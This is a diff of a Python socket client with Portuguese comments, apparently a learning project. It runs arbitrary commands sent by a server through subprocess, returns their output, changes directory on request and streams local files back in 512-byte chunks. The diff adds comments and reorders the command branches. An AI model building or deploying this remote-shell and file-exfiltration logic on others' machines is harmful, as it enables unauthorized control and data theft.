@@ -59,13 +59,14 @@ if __name__ == "__main__":
 
                 # Tratando se for Comando
                 elif entry[:3] == 'cmd':
+                    print(entry)
                     # Reconhece o cmd copiar
                     if entry[3:6] == 'cpy':
                         caminho_arq = os.path.join(os.getcwd(), entry[6:len(entry)-1])
 
-                        send_file = [open(caminho_arq, 'rb'),
-                                     os.path.getsize(caminho_arq),
-                                     True]
+                        # Criando um vetor [<arq>, <tam_arq>, <verdadeiro>]
+                        # Posição           0      1          2
+                        send_file = [open(caminho_arq, 'rb'), os.path.getsize(caminho_arq), True]
 
                         # soc.send(str(send_file[1]).encode())
                 
@@ -79,33 +80,49 @@ if __name__ == "__main__":
                         #        soc.send('FIL{}'.format(data).encode())
                         #        print('Arquivo {} Enviado!'.format(entry[6:]))
                         #        continue
-                
                     elif entry[3:] == 'cd':
                         soc.send(os.getcwd().encode())
                         continue
                     
-                    elif len(entry) > 0:
-                        saida = subprocess.getoutput(entry[3:])
-                        print(saida)
-                        soc.send(saida.encode())
+                    #elif len(entry) > 0:
+                        #saida = subprocess.getoutput(entry[3:])
+                        #print(saida)
+                        #soc.send(saida.encode())
 
                     elif entry[3:5] == 'cd':
                         print('Comando do Servidor >>> {}'.format(entry[6:]))
                         os.chdir(entry[6:len(entry)-1])
                         soc.send((os.getcwd()).encode())
+                        
+                    elif len(entry) > 0:
+                        saida = subprocess.getoutput(entry[3:])
+                        print(saida)
+                        soc.sendall(saida.encode())
 
+                        
             elif mask & selectors.EVENT_WRITE:
                 if send_file:
+                    # Por isso a 2 posição e Boleana, se for True envia o tamanho
+                    # ai mudamos para false, para não enviar o tamanho
+                    # mais de uma vez... Genial
                     if send_file[2]:
                         print('Enviando tamanho ... {}'.format(send_file[1]))
                         key.fileobj.send('FIL{}'.format(send_file[1]).encode())
                         send_file[2] = False
+
+                    # Se o tamanho do arq for maior que 0
                     elif send_file[1] > 0:
+                        # Se o tamanho for maior que 512
                         if send_file[1] > 512:
                             print('Enviando pedaço ... 512')
+                            # Vai ler apenas 512<tamanho> do arquivo e guardar no data
                             data = send_file[0].read(512)
+                            # Enviando o pedaço do arqv
                             key.fileobj.send('FIL{}'.format(data).encode())
+                            # Removendo o pedaço enviado do vetor
                             send_file[1] = send_file[1] - 512
+                            
+                        # se for menor envia direto
                         else:
                             print('Enviando pedaço ... {}'.format(send_file[1]))
                             data = send_file[0].read(send_file[1])
